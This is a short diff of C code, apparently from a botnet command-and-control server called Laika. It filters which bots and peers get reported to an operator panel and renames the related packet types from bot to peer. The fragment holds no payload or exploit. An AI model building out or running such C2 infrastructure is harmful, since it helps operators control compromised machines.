@@ -10,14 +10,19 @@ inline void checkAuthenticated(struct sLaika_peer *peer) {
 bool sendPanelPeerIter(struct sLaika_socket *sock, void *uData) {
     struct sLaika_peer *peer = (struct sLaika_peer*)sock;
     struct sLaika_peer *panel = (struct sLaika_peer*)uData;
+    struct sLaika_cnc *cnc = (struct sLaika_cnc*)panel->uData;
 
-    laikaC_sendNewPeer(panel, peer);
+    /* make sure we're not sending cnc info lol, also don't send connection information about themselves */
+    if (&peer->sock != &cnc->sock && peer != panel) {
+        LAIKA_DEBUG("sending peer info %lx (cnc: %lx, panel: %lx)\n", peer, cnc, panel);
+        laikaC_sendNewPeer(panel, peer);
+    }
 
     return true;
 }
 
 void laikaC_sendNewPeer(struct sLaika_peer *panel, struct sLaika_peer *bot) {
-    laikaS_startOutPacket(panel, LAIKAPKT_AUTHENTICATED_ADD_BOT);
+    laikaS_startOutPacket(panel, LAIKAPKT_AUTHENTICATED_ADD_PEER);
 
     /* write the bot's pubkey & peerType */
     laikaS_write(&panel->sock, bot->peerPub, sizeof(bot->peerPub));
@@ -27,7 +32,7 @@ void laikaC_sendNewPeer(struct sLaika_peer *panel, struct sLaika_peer *bot) {
 }
 
 void laikaC_sendRmvPeer(struct sLaika_peer *panel, struct sLaika_peer *bot) {
-    laikaS_startOutPacket(panel, LAIKAPKT_AUTHENTICATED_RMV_BOT);
+    laikaS_startOutPacket(panel, LAIKAPKT_AUTHENTICATED_RMV_PEER);
 
     /* write the bot's pubkey */
     laikaS_write(&panel->sock, bot->peerPub, sizeof(bot->peerPub));
